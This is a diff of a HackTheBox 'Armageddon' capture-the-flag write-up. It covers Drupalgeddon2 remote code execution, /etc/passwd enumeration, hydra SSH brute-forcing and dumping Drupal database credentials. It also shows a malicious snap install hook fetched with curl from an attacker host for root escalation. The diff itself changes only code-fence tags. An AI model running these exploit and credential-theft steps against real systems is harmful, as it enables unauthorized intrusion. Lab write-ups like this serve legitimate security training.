@@ -8,7 +8,7 @@ tags: ["htb"]
 
 # nmap
 
-```
+```sh
 # Nmap 7.92 scan initiated Tue Dec 28 20:02:10 2021 as: nmap -sCV -oN armageddon 10.10.10.233
 Nmap scan report for 10.10.10.233
 Host is up (0.079s latency).
@@ -45,7 +45,7 @@ From the `nmap` scan and an extension called `wappalyzer`, I found the following
 
 # gobuster
 
-```
+```sh
 [tyco㉿4YE: ~/htb/armageddon/scans]$ gobuster dir -u http://10.10.10.233 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster -x sh,txt,php -k
 
 /index.php            (Status: 200) [Size: 7440]
@@ -82,7 +82,7 @@ Drupal is an open source content management platform supporting a variety of
 websites ranging from personal weblogs to large community-driven websites...
 ```
 
-```json
+```
 REQUIREMENTS AND NOTES
 ----------------------
 
@@ -108,9 +108,9 @@ There were two ways I got RCE. One was through a [python script](https://github.
 
 ## drupal SQL injection
 
-https://www.exploit-db.com/exploits/34992 did not work.
+[https://www.exploit-db.com/exploits/34992](https://www.exploit-db.com/exploits/34992 ) did not work.
 
-```
+```sh
 [tyco㉿4YE: ~/htb/armageddon]$ python 34992.py -t http://10.10.10.233 -u admin -p hehe 
 
   ______                          __     _______  _______ _____    
@@ -140,11 +140,11 @@ https://www.exploit-db.com/exploits/34992 did not work.
 
 RCE worked! However, I could only run one commands at a time.
 
-## system enumeration
+### system enumeration
 
 `id` command to show username and groups that the user is in:
 
-```
+```sh
 [tyco㉿4YE: ~/htb/armageddon/CVE-2018-7600]$ python3 drupa7-CVE-2018-7600.py http://10.10.10.233 -c id
 
 =============================================================================
@@ -160,7 +160,7 @@ uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_
 
 `cat /etc/passwd` to enumerate user. I found that the user was `brucetherealadmin`:
 
-```
+```sh
 [tyco㉿4YE: ~/htb/armageddon/CVE-2018-7600]$ python3 drupa7-CVE-2018-7600.py http://10.10.10.233 -c "cat /etc/passwd"  
 
 =============================================================================
@@ -196,7 +196,7 @@ brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
 
 `ss -peanut` to see running ports on the system:
 
-```
+```sh
 [tyco㉿4YE: ~/htb/armageddon/CVE-2018-7600]$ python3 drupa7-CVE-2018-7600.py http://10.10.10.233 -c "ss -peanut"                                                                    
 
 =============================================================================
@@ -221,7 +221,7 @@ Aside from enumerating the files in `/var/www/html`, I actually skipped everythi
 
 I saw that MySQL was running locally, but I could not connect to the database. I thought this was a rabbit hole, so I moved on pretty quickly after it returned nothing.
 
-```
+```sh
 [tyco㉿4YE: ~/htb/armageddon/CVE-2018-7600]$ python3 drupa7-CVE-2018-7600.py http://10.10.10.233 -c "mysql -u root -p"
 
 =============================================================================
@@ -236,7 +236,7 @@ I saw that MySQL was running locally, but I could not connect to the database. I
 
 Without a way to see the home directory, I was confused what I was supposed to do next. It was odd that I could not access the home directory. I kept enumerating the system but could not find any passwords (*ha*) that I could try to use to SSH into the user `brucetherealadmin`. The next logical step in my mind was bruteforcing, but I was a bit hesitant because I was questioning if that was the intended path of the box. I'm not a big fan of guessing passwords on HackTheBox (like Nibbles). I ended up trying it out in the background as I continued enumerating the system, AND IT WORKED!
 
-```
+```sh
 [tyco㉿4YE: ~/htb/armageddon]$ hydra -l brucetherealadmin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.233
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-28 21:40:13
@@ -257,7 +257,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-28 21:41:
 
 `snap` is package manager similar to `apt`, developed by Canonical (Ubuntu). `snap` was created as a way to have cross-platform packages that could be used across many Linux distributions. Snaps are different from normal packages however, because they are sandboxed applications that are bundled with their own dependencies. This makes snap packages easy to install and use. These packages have a `.snap` extension and is a filesystem containing the application itself, libraries, dependencies, and metadata. It is compressed with `SquashFS`, so you can run `unsquash -ll <snap package>` to see the contents inside a snap package.
 
-```
+```sh
 [tyco㉿4YE: ~/htb/armageddon/snap]$ unsquashfs -ll test.snap 
 drwxr-xr-x root/root                27 2021-12-29 11:42 squashfs-root
 drwxr-xr-x root/root                45 2021-12-29 11:42 squashfs-root/meta
@@ -270,7 +270,7 @@ drwxr-xr-x root/root                30 2021-12-29 11:42 squashfs-root/meta/hooks
 
 With the password bruteforced, we can now SSH into the box, and run `sudo -l` to see what commands the user can run.
 
-```
+```sh
 [brucetherealadmin@armageddon ~]$ sudo -l
 
 User brucetherealadmin may run the following commands on armageddon:
@@ -308,7 +308,7 @@ To break it down, we're creating a malicious package, and all it is doing is run
 
 4. `chmod +x meta/hooks/install` will make the script world executable. When the hook is called, the executable bit (the `x` in `-rwxr-xr-x`) will allow it to run the script.
 
-   ```
+   ```sh
    -rwxr-xr-x root/root                35 2021-12-29 11:42 squashfs-root/meta/hooks/install
    ```
 
@@ -321,7 +321,7 @@ To break it down, we're creating a malicious package, and all it is doing is run
 
 Now all there is to do is to transfer the snap package over to the box, and install it.
 
-```
+```sh
 [brucetherealadmin@armageddon ~]$ curl http://10.10.14.10:8000/xxxx_1.0_all.snap -o xxxx_1.0_all.snap
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -338,7 +338,7 @@ error: cannot perform the following tasks:
 
 At first, I thought it did not work since the ruby file errored out, so that is why I moved on to the Python script.
 
-```
+```sh
 [tyco㉿4YE: ~/htb/armageddon/Drupalgeddon2]$ ./drupalgeddon2.rb http://10.10.10.233
 
 Traceback (most recent call last):
@@ -353,7 +353,7 @@ However, the [troubleshooting](https://github.com/dreadlocked/Drupalgeddon2#trou
 
 This issue can be fixed by installing a ruby gem called `highline`.
 
-```
+```sh
 [tyco㉿4YE: ~/htb/armageddon/Drupalgeddon2]$ sudo gem install highline
 [sudo] password for tyco: 
 
@@ -367,7 +367,7 @@ Done installing documentation for highline after 2 seconds
 
 Now run the ruby script again, and it should work and create an interactive shell for you. This exploit is much better than the python script above since we actually have an interactive shell.
 
-```
+```sh
 [tyco㉿4YE: ~/htb/armageddon/Drupalgeddon2]$ ./drupalgeddon2.rb http://10.10.10.233
 [*] --==[::#Drupalggedon2::]==--
 --------------------------------------------------------------------------------
@@ -404,7 +404,7 @@ armageddon.htb>>
 
 I saw `settings.php` while enumerating the website, but it did not load on Firefox, and I did not give it a second thought. If I kept of the files that would not render on Firefox, I could've taken a second look at it when I got on the box and found the Drupal credentials when I was enumerating this directory initially.
 
-```
+```sh
 armageddon.htb>> pwd
 
 /var/www/html
@@ -492,20 +492,20 @@ We know there is MySQL running on the system locally, so let's authenticate with
 
 At first, I was confused because I could not authenticate:
 
-```
+```sh
 armageddon.htb>> mysql -u drupaluser -p CQHEy@9M*m23gBVj 
 Enter password: ERROR 1045 (28000): Access denied for user 'drupaluser'@'localhost' (using password: NO)
 ```
 
 A quick google search led me to this [Stack Overflow](https://stackoverflow.com/questions/5131931/connecting-to-mysql-from-the-command-line) page. I entered the password again without any space between `-p` and the password and it worked!
 
-```
+```sh
 -p: password (**no space between -p and the password text**)
 ```
 
 Used credentials to log into `MySQL`:
 
-```
+```sh
 armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;'                                           
 
 Database
@@ -517,7 +517,7 @@ performance_schema
 
 Further enumeration of the `drupal` database:
 
-```
+```sh
 armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; show tables;\G'
 
 Tables_in_drupal
@@ -528,7 +528,7 @@ users
 
 Getting everything from the `users` table (Append `\G` to the end of your SQL query but before the `;` to print the output in vertical rows for readability):
 
-```mysql
+```sh
 armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; select * from users\G;'
 
              uid: 1   
